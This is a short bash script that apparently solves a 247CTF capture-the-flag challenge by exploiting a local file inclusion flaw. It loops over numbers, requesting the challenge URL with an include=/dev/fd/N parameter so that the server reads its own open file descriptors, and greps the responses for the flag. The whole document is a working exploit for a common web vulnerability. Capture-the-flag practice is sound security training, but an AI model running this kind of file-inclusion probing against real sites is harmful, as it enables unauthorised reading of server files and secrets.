#!/bin/bash

usage() {
    echo "usage: $1 <url> <tries>"
    echo
    echo "url  : challenge url"
    echo "tries: number of file descriptors to try"
    exit 1
}

URL=$1
TRY=$2

if [[ "$#" -ne 2 ]]; then
    usage $0
fi

for idx in $(seq $TRY); do
    v=$(curl -s $URL/?include=/dev/fd/$idx | grep 247CTF)
    if [[ ${#v} -gt 0 ]]; then
        echo "flag: $v"
        exit 0
    fi
done

echo "flag not found, try to increase 'tries' and try again"
